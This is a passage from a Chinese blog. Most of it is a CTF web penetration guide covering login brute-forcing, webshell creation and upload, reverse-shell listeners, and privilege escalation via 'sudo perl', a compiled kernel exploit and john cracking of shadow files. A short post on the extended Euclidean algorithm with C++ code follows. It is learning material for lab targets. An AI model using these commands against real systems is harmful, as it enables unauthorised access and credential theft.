<p>​    a、sql注入：《CTF渗透引入》、《SQL注入》</p>
<p>​    b、SSI注入：《SSI注入》</p>
<p>​    c、命令注入：《命令注入》</p>
<p>​    d、目录遍历：《目录遍历漏洞》</p>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><h4 id="1、使用msf暴力破解"><a href="#1、使用msf暴力破解" class="headerlink" title="1、使用msf暴力破解"></a>1、使用msf暴力破解</h4><p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200102859.png" alt="image-20211104200102859"></p>
<p>《web安全暴力破解》</p>
<p>a.利用wpscan获取用户名和密码（如果没有探测到）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211031163357930.png" alt="image-20211031163357930"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200258439.png" alt="image-20211104200258439"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211031163538379.png" alt="image-20211031163538379"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200421430.png" alt="image-20211104200421430"></p>
<p>b.利用msf暴力破解登录密码</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200509299.png" alt="image-20211104200509299"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200514650.png" alt="image-20211104200514650"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200526368.png" alt="image-20211104200526368"></p>
<p>rhost：靶机地址（lhost：攻击地址）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200551621.png" alt="image-20211104200551621"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200556107.png" alt="image-20211104200556107"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200600049.png" alt="image-20211104200600049"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200611821.png" alt="image-20211104200611821"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104200617555.png" alt="image-20211104200617555"></p>
<h4 id="2、使用burpsuite爆破"><a href="#2、使用burpsuite爆破" class="headerlink" title="2、使用burpsuite爆破"></a>2、使用burpsuite爆破</h4><p>a、获取爆破用的字典（这里是kali自带的sql注入字典）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102140627873.png" alt="image-20211102140627873"></p>
<p>b、设置中断获取爆破页面数据</p>
<p>设置浏览器代理服务器</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201522077.png" alt="image-20211104201522077"></p>
<p>启动中断</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201537419.png" alt="image-20211104201537419"></p>
<p>截取数据</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201555173.png" alt="image-20211104201555173"></p>
<p>c、爆破</p>
<p>将抓取的页面发到intruder模块进行爆破</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201619332.png" alt="image-20211104201619332"></p>
<p>设置爆破区域</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201630302.png" alt="image-20211104201630302"></p>
<p>设置爆破字典</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201643667.png" alt="image-20211104201643667"></p>
<p>启动</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201653148.png" alt="image-20211104201653148"></p>
<p>查看结果</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201703598.png" alt="image-20211104201703598"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104201710210.png" alt="image-20211104201710210"></p>
<p>（最后发现输入返回长度为2900的是正确密码：例子出自《CTF综合测试》）</p>
<h2 id="步骤4：上传webshell"><a href="#步骤4：上传webshell" class="headerlink" title="步骤4：上传webshell"></a>步骤4：上传webshell</h2><p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103733193.png" alt="image-20211105103733193"></p>
<h3 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h3><h4 id="1、制作php的webshell"><a href="#1、制作php的webshell" class="headerlink" title="1、制作php的webshell"></a>1、制作php的webshell</h4><p>​    a、使用/usr/share/webshell/php下的webshell（kali自带）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104210730250.png" alt="image-20211104210730250"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211031151536728.png" alt="image-20211031151536728"></p>
<p>b、利用kali生成php的webshell</p>
<p>输入正确的参数（lhost、端口号等），再把内容拷贝到php文件即可使用</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104211453611.png" alt="image-20211104211453611"></p>
<h4 id="2、制作python的websehll"><a href="#2、制作python的websehll" class="headerlink" title="2、制作python的websehll"></a>2、制作python的websehll</h4><p>这里的方法和生成php的webshell是一样的，只是这里加了重定向。</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104211632043.png" alt="image-20211104211632043"></p>
<h4 id="3、制作elf的webshell"><a href="#3、制作elf的webshell" class="headerlink" title="3、制作elf的webshell"></a>3、制作elf的webshell</h4><p>用于命令注入</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104211112036.png" alt="image-20211104211112036"></p>
<h4 id="4、命令执行webshell"><a href="#4、命令执行webshell" class="headerlink" title="4、命令执行webshell"></a>4、命令执行webshell</h4><p>在输入端输入一下webshell（要按实际情况改）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104211247531.png" alt="image-20211104211247531"></p>
<h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><p>​    一般而言，webshell都是上传到404页面，因为方便利用</p>
<p>​    ●登录后台网站，直接上传文件，或者操作服务器下载文件</p>
<p>​    ●通过upload等服务，上传文件，或者操作服务器下载文件</p>
<p>​    ●有时候需要绕过防火墙上传文件，如《CTF综合测试》</p>
<p>​    ●利用注入漏洞上传文件</p>
<p>注意：如果需要服务器下载靶场的文件（如：webshell），需要在攻击机（kali）开启/创建http服务。</p>
<p><strong>启动/创建HTTP服务</strong></p>
<p><strong>方法一：</strong>python -m “SimpleHTTPServer”</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105094111832.png" alt="image-20211105094111832"></p>
<h2 id="步骤5：渗透获取shell"><a href="#步骤5：渗透获取shell" class="headerlink" title="步骤5：渗透获取shell"></a>步骤5：渗透获取shell</h2><p><strong>说明：</strong>渗透的方法有很多，方法不唯一。</p>
<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><h4 id="a、利用msf监听"><a href="#a、利用msf监听" class="headerlink" title="a、利用msf监听"></a>a、利用msf监听</h4><p>启动msf</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102170833011.png" alt="image-20211102170833011"></p>
<p>配置playload并启动监听（端口和lhost需要按实际来）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104220108129.png" alt="image-20211104220108129"></p>
<h4 id="b、使用nc-nlvp-port监听"><a href="#b、使用nc-nlvp-port监听" class="headerlink" title="b、使用nc -nlvp port监听"></a>b、使用nc -nlvp port监听</h4><p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103954832.png" alt="image-20211105103954832"></p>
<h3 id="触发反弹shell"><a href="#触发反弹shell" class="headerlink" title="触发反弹shell"></a>触发反弹shell</h3><p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103820072.png" alt="image-20211105103820072"></p>
<p>触发shell方法    </p>
<p>​    ●点击点击/打开/查看文件</p>
<p>​    ●通过访问链接触发shell</p>
<p>​    ●等等</p>
<p>顺利的话，触发wenshell文件就会反弹shell了。</p>
<h2 id="步骤6：提权"><a href="#步骤6：提权" class="headerlink" title="步骤6：提权"></a>步骤6：提权</h2><p>​    反弹的shell一般都是普通用户权限，而flag常常在root权限，因此需要提权。如果反弹的shell不是终端（终端输入标识“$”、“~”、“#”），而是标准输入（什么都没或者是”&gt;”）;这是往往需要获取终端，因为sudo等操作往往需要终端输入。</p>
<h3 id="1、获取-启动终端"><a href="#1、获取-启动终端" class="headerlink" title="1、获取/启动终端"></a>1、获取/启动终端</h3><p>​        ● python -c  “ import pty;pty.spawn(‘/bin/bash’)” </p>
<p>​        ● python -c  “ import pty;pty.spawn(‘bin/sh’)”</p>
<p>​        ● python /tmp/asdf.py</p>
<p>​        ● echo “import pty;pty.spawn(‘/bin/bash’)” &gt; /tmp/asdf.py</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105102839635.png" alt="image-20211105102839635"></p>
<p>​    获取终端后，可以尝试用su命令使用弱密码尝试提权</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105104134139.png" alt="image-20211105104134139"></p>
<h3 id="2、查看用户可以使用那些root权限操作"><a href="#2、查看用户可以使用那些root权限操作" class="headerlink" title="2、查看用户可以使用那些root权限操作"></a>2、查看用户可以使用那些root权限操作</h3><p>​    <strong>sudo -l：</strong>查看普通用户可以使用那些sudo权限</p>
<h3 id="3、提权"><a href="#3、提权" class="headerlink" title="3、提权"></a>3、提权</h3><h4 id="a、利用密码提权"><a href="#a、利用密码提权" class="headerlink" title="a、利用密码提权"></a>a、利用密码提权</h4><p>​    su -用户名；再输入密码即可；更多的时候是需要自己探测用户名和密码；如进入数据库查找（《CTF综合测试》）、利用注入漏洞寻找等</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211030112056550.png" alt="image-20211030112056550"></p>
<h4 id="b、使用perl命令提权"><a href="#b、使用perl命令提权" class="headerlink" title="b、使用perl命令提权"></a>b、使用perl命令提权</h4><p>​    ①前提：用户可以执行perl命令</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211101222507358.png" alt="image-20211101222507358"></p>
<p>​    ②步：sudo perl -e “exec ‘/bin/sh’ “：运行sh，通过perl命令提权</p>
<p>​    ③步：bash -i ：以交互模式运行bash</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105102320820.png" alt="image-20211105102320820"></p>
<h4 id="c、溢出提权"><a href="#c、溢出提权" class="headerlink" title="c、溢出提权"></a>c、溢出提权</h4><p>​    详情看《FTP服务后门利用》</p>
<h4 id="d、内核溢出提权"><a href="#d、内核溢出提权" class="headerlink" title="d、内核溢出提权"></a>d、内核溢出提权</h4><p>查找漏洞：searchsploit 系统 版本号</p>
<p>​    如：searchsploit ubuntu 4.4.0</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105101709122.png" alt="image-20211105101709122"></p>
<p>​    使用第三个漏洞（内核溢出代码文件名：41458.c）</p>
<p>将其内核溢出代码复制到桌面并编译为可以执行的文件<br>    cp /usr/share/exploitdb/exploits/linux/local/41458.c /root/desktop/1234.c</p>
<p>​    gcc 1234.c -o shellroot</p>
<p>​    参数说明：-o是输入，输出文件名问shellroot</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105101312890.png" alt="image-20211105101312890"></p>
<p>利用获取的shell将sehllroot上传到靶机并设置文件执行权限</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105101645298.png" alt="image-20211105101645298"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105101737053.png" alt="image-20211105101737053"></p>
<p>执行shellroot</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105101818781.png" alt="image-20211105101818781"></p>
<h4 id="e、利用john破解"><a href="#e、利用john破解" class="headerlink" title="e、利用john破解"></a>e、利用john破解</h4><p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103144827.png" alt="image-20211105103144827"></p>
<p>进入会话，下载passwd和shadow</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103210995.png" alt="image-20211105103210995"></p>
<p>文件格式化并重定向</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103236376.png" alt="image-20211105103236376"></p>
<p>使用john爆破出用户名和密码</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105103256494.png" alt="image-20211105103256494"></p>
<h2 id="步骤7：获取flag"><a href="#步骤7：获取flag" class="headerlink" title="步骤7：获取flag"></a>步骤7：获取flag</h2><p>a、可疑网页及其源码处：有时候网页会存在flag信息，通过源码的注释或代码审计也有可能发现flag</p>
<p>b、当获取到普通shell时，需要有意识的查看其home目录下的文件，有时候会发现flag</p>
<p>c、root根目录下的flag，渗透模块，root目录下必然会存在falg，它常常存在root的根目录下</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211105105225124.png" alt="image-20211105105225124"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211126110613621.png" alt="image-20211126110613621"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/" class="post-title-link" itemprop="url">欧几里得扩展算法</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-10-26 21:55:29" itemprop="dateCreated datePublished" datetime="2021-10-26T21:55:29+08:00">2021-10-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-11-27 21:17:10" itemprop="dateModified" datetime="2021-11-27T21:17:10+08:00">2021-11-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" itemprop="url" rel="index"><span itemprop="name">密码学</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="欧几里得算法与欧几里得扩展算法"><a href="#欧几里得算法与欧几里得扩展算法" class="headerlink" title="欧几里得算法与欧几里得扩展算法"></a>欧几里得算法与欧几里得扩展算法</h1><h2 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h2><p>gcd(a,b) :a和b的最大公因子（公约数），下面同记为(a,b)，a，b∈Z</p>
<p><strong>1.定理：(a,b) = (b,a mod b)**</strong> </p>
<p>推导过程：</p>
<p>∵ a，b∈Z， </p>
<p>∴ 有a = kb + r  ,    k,r∈Z        ①</p>
<p>则 a mod b = r                        ②</p>
<p>联合①②： a mod b = a-kb   ③</p>
<p>设g = gcd（a，b）</p>
<p>则：a%g = 0（a mod g=0），b%g = 0；即a%g = b%g</p>
<p>可以推出：(a - b)%g = 0        ④</p>
<p>（a、b都是g的倍数关系，所以a和b的差值也是最大公因子g的倍数关系）</p>
<p>结合③和④</p>
<p>推出： （a mod b）%g = 0</p>
<p>所以g是a，b，（a mod b）的公因子</p>
<p>∴ (a,b) = (b,a mod b) </p>
<p><strong>2.欧几里得算法（辗转相除法）</strong></p>
<p>第一步：（a0，b0）</p>
<p>第二步：（a1，b1），a1= b0, b1 = a0%b0</p>
<p>……</p>
<p>第n步：（an，bn），当bn = 0时，an就是（a，b）最大公约数</p>
<h2 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h2><p><strong>1.求逆元原理</strong></p>
<p>推导过程：</p>
<p>设（a，b）是a，b的最大公约数，则有a.x1 = k1(a,b), b.y1 = k2(a,b) ,k1,k2∈Z       “.”是乘法</p>
<p>可以推导出：a.x1 + b.y1 = k3(a,b)  ，k3 = k1+k2，k3∈Z</p>
<p>所以必然存在</p>
<p>​                    ax + by = （a，b ）</p>
<p>当（a，b）=1时，a，b互质（又称为互为素数），得：</p>
<p>​                    ax + by =1      （x是a的逆元，y是b的逆元）</p>
<p>所以有：a*X = bY+1         （正负号写不写无所谓，因为它对公式没什么意义，Y可正可负）</p>
<p>​                    X = （bY+1）/a        </p>
<p>​                    Y = （aX+1）/a</p>
<p><strong>2.扩展的欧几里得算法</strong></p>
<p>由欧几里得算法得：</p>
<p>​      （a，b） =  （b，a mod b）        ①</p>
<p>​       ∵ ax + by =  (a,b)                            ②</p>
<p> 联合①②得：</p>
<p>​        b.x1 +（a mod b）.y1 =  (a,b)     ③    </p>
<p>​       a mob b = a%b = a - (a/b).b         ④    “/“是除法</p>
<p>联合③④</p>
<p>​        gcd = （a，b） = b.x1+[a - (a/b).b].y1</p>
<p>​                                    =b.x1 + a.y1 - (a/b).b.y1</p>
<p>​                                    =a.y1 + b.[x1 - (a/b).y1]</p>
<p>对比：(a,b) = ax + by</p>
<p>可以推导出：</p>
<p>​                x = y1</p>
<p>​                y = x1 - (a/b).y1</p>
<p>附：求逆元C++算法（菜鸟版）</p>
<pre><code>#include &lt;iostream&gt;  
using namespace std;  
typedef long long LL;  
typedef double DB;  

//aX+bY=gcd；x是a的逆元，Y是b的逆元；ans（gcd）是最大公约数  
LL e_gcd(LL a,LL b,LL &amp;x,LL &amp;y)  
&#123;  
    if(b==0)  
    &#123;  
        x=1;  
        y=0;  
        return a;  
    &#125;  
    LL ans=e_gcd(b,a%b,x,y);  
    LL temp=x;  
    x=y;  
    y=temp-a/b*y;  
    return ans;  
&#125;  

LL cal(LL a,LL b,LL c)  
&#123;  
    LL x,y;  
    LL gcd=e_gcd(a,b,x,y);  
    if(c%gcd!=0)&#123; 
        printf(&quot;没有逆元&quot;);
        return -1;  //判断是否有逆元or两个数（a、b）是否质，即gcd最大公约数是否是1     
        &#125;
    x*=c/gcd;  
    b/=gcd;  
    if(b&lt;0) b=-b;  
    printf(&quot;x的逆元=%ld,y的逆元=%ld\n&quot;,x,y); 
    //这里求得的逆元可能为负数，再求mod转回正数即可 
    LL X=x%b;  
    if(X&lt;=0) X+=b;      // X是a的逆元，当其小于0时，由aX+bY=gcd，即（a，b）=gcd得，a的逆元&lt;b,为了取正数，所以需要+b； 
    return X;  
&#125;  

int main()  
&#123;  
    LL a,b,t;  
    //a=1769;
    //b=550;
    cout &lt;&lt; &quot;请输入a:&quot;;
    cin &gt;&gt; a;
    cout &lt;&lt; &quot;请输入b:&quot;;
    cin &gt;&gt; b;
    LL ans=cal(a,b,1);   
    printf(&quot;x的逆元=%lld\n&quot;,ans);  

    return 0;  
&#125; </code></pre>
<p><strong>进阶版伪代码</strong></p>
<pre><code>EXTENDED EUCLID(a,b)     //b&lt;a
1.(X1,X2,X3) ← (1,0,a);(Y1,Y2,Y3) ← (0,1,b)
2.if Y3 = 0 then return X3 = (a,b);no inverse        //没有逆元
3.if Y3 = 1 then Y3 = (a,b);Y2 = b^(-1) mod f        //b^(-1)为b的逆元
4.Q = ┕ X3/Y3 ┘        //X3/Y3向下取整
5.(T1,T2,T3) ← (X1-Q.Y1,X2-Q.Y2,X3-Q.Y3)
6.(X1,X2,X3) ← (Y1,Y2,Y3)
7.(Y1,Y2,Y3) ← (T1,T2,T3)
8.go to 2.</code></pre>
<p>上述的算法中存在关系：a.T1 + b.T2 = T3</p>
<p><strong>笔算例子：</strong></p>
<p>求gcd（1769,550）；因为（1769,550）=1，所以题意550*<img src="/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/clip_image002-16380170166661.png" alt="img">=1 mod 1769，求<img src="/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/clip_image002.png" alt="img">，</p>
<table>
<thead>
<tr>
<th>循环次数</th>
<th>Q</th>
<th>X1</th>
<th>X2</th>
<th>X3（a）</th>
<th>Y1</th>
<th>Y2</th>
<th>Y3（b）</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>-</td>
<td>1</td>
<td>0</td>
<td>1769</td>
<td>0</td>
<td>1</td>
<td>550</td>
</tr>
<tr>
<td>1</td>
<td>3</td>
<td>0</td>
<td>1</td>
<td>550</td>
<td>1</td>
<td>-3</td>
<td>119</td>
</tr>
<tr>
<td>2</td>
<td>4</td>
<td>1</td>
<td>-3</td>
<td>119</td>
<td>-4</td>
<td>13</td>
<td>74</td>
</tr>
<tr>
<td>3</td>
<td>1</td>
<td>-4</td>
<td>13</td>
<td>74</td>
<td>5</td>
<td>-16</td>
<td>45</td>
</tr>
<tr>
<td>4</td>
<td>1</td>
<td>5</td>
<td>-16</td>
<td>45</td>
<td>-9</td>
<td>29</td>
<td>29</td>
</tr>
<tr>
<td>5</td>
<td>1</td>
<td>-9</td>
<td>29</td>
<td>29</td>
<td>14</td>
<td>-45</td>
<td>16</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>14</td>
<td>-45</td>
<td>16</td>
<td>-23</td>
<td>74</td>
<td>13</td>
</tr>
<tr>
<td>7</td>
<td>1</td>
<td>-23</td>
<td>74</td>
<td>13</td>
<td>37</td>
<td>-119</td>
<td>3</td>
</tr>
<tr>
<td>8</td>
<td>4</td>
<td>37</td>
<td>-119</td>
<td>3</td>
<td>-171</td>
<td>550</td>
<td>1</td>
</tr>
</tbody></table>
<p>​    Y3=1，即（1769,550）=1，<img src="/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/clip_image002-16380179197372.png" alt="img">，即550*550 mod 1769 = 1</p>
<p>​    <img src="/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/clip_image004.png" alt="img">，379 *1769 mod 550 =379 * 119 mod 550 =1</p>
<p>​    注意：a<em>b mod c = （a mod c）</em>（b mod c）mod c</p>
<p><strong>笔算过程介绍：</strong></p>
<p>​            <img src="/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/clip_image002-16380182844974.png" alt="img">；<img src="/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/clip_image002-16380184891145.png" alt="img">；<img src="/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/clip_image002-16380185263996.png" alt="img">；<img src="/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/clip_image002-16380181103953.png" alt="img"></p>
<p>​            <img src="/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/clip_image002-16380186865857.png" alt="img">；<img src="/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/clip_image002-16380187037178.png" alt="img">；<img src="/2021/10/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/clip_image002-16380188124009.png" alt="img"></p>
<p>i指循环次数，Q是向下取整的商，下一轮的X是对应上一轮的Y；下一轮Y3是上一轮X3和Y3的模运算结果。</p>

      
    </div>

    
    
    
